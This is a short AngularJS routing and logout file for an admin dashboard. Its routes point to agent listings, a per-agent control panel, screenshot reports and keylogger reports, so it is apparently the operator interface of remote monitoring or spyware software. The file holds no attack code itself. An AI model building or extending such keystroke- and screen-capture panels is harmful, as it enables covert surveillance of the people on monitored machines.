var app = angular.module("adminApp", ['ngRoute', 'ngDialog']);

app.config(function ($routeProvider) {
  $routeProvider
    .when('/', {
      templateUrl: 'components/agents/agents.html',
      controller: 'agentsController'
    })
    .when('/cp/:agentId', {
      templateUrl: 'components/controlPanel/controlPanel.html',
      controller: 'controlPanelController'
    })
    .when('/screen/:agentId', {
      templateUrl: 'components/screenshotReport/screenshotReport.html',
      controller: 'screenshotReportController'
    })
    .when('/keylogger/:agentId', {
      templateUrl: 'components/keyloggerReport/keyloggerReport.html',
      controller: 'keyloggerReportController'
    })
})


app.controller('adminController', function ($scope, $rootScope, $http, $window) {

  var url = window.location.origin + "/signOut"

  $rootScope.logout = function () {
    $http.put(url).then(function (response) {
      if (response.status == 204) {
        $window.location.href = '/dashboard/login.html'
      } else {
        console.log(response)
      }
    }).catch(function (err) {
      console.log(err)
    })
  }

  $rootScope.home = function () {
    $window.location.href = '/dashboard'    
  }

})
